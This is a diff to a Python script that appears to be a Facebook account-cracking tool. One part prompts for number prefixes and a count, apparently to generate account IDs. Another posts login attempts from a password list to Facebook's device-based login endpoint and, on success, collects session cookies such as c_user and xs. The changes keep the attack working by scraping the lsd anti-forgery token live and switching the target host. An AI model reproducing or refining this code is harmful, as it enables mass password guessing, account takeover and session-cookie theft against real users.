@@ -336,7 +336,7 @@ def randm():
 def bd():
 		user=[]
 		clear()
-		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 017 | 019 | 018 | 016 ');linex()
+		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 9815 | 9814 | 9861 | 9840 ');linex()
 		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
 		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
 		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
@@ -1305,8 +1305,8 @@ def rndm4(uid,passlist):
 'sec-fetch-site': 'same-origin',
 'user-agent': 'Mozilla/5.0 (Linux; Android zh-cn 8; Redmi X Build/2423.0.015) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.4618.94 RealmeBrowser/35.5.0.812.18.3-gn',
 'x-asbd-id': '129477',
-'x-fb-lsd': 'AVpIztggBCA'}
-                        session.post(f'https://m.facebook.com/login/device-based/login/async/',data=data,headers=headers).text
+'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
+                        session.post(f'https://www.facebook.com/login/device-based/login/async/',data=data,headers=headers).text
                         log_cookies=session.cookies.get_dict().keys()
                         if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                                         coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
